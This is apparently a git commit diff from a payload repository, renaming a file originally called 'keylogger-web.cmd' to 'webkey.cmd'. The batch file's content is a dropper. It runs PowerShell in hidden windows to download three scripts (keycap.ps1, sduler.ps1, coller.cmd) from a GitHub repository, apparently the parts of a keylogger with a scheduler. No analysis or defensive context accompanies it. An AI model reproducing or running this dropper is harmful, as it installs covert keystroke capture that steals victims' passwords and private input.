1e243b1c8d3a68597de0a4108e61ec8a87eef309
gozen-foto <gofoto.zen@proton.me>
2026-06-01 11:49:08 +0530

    Update and rename keylogger-web.cmd to webkey.cmd

--- paypack/keycap/webkey.cmd
+++ paypack/keycap/webkey.cmd
@@ -1,7 +1,4 @@
 @echo off
-
 powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://github.com/gozen-foto/zebroy/blob/main/paypack/keycap/keycap.ps1 -OutFile keycap.ps1"
-
 powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://github.com/gozen-foto/zebroy/blob/main/paypack/keycap/sduler.ps1 -OutFile sduler.ps1"
-
 powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://github.com/gozen-foto/zebroy/blob/main/paypack/keycap/coller.cmd -OutFile coller.cmd"
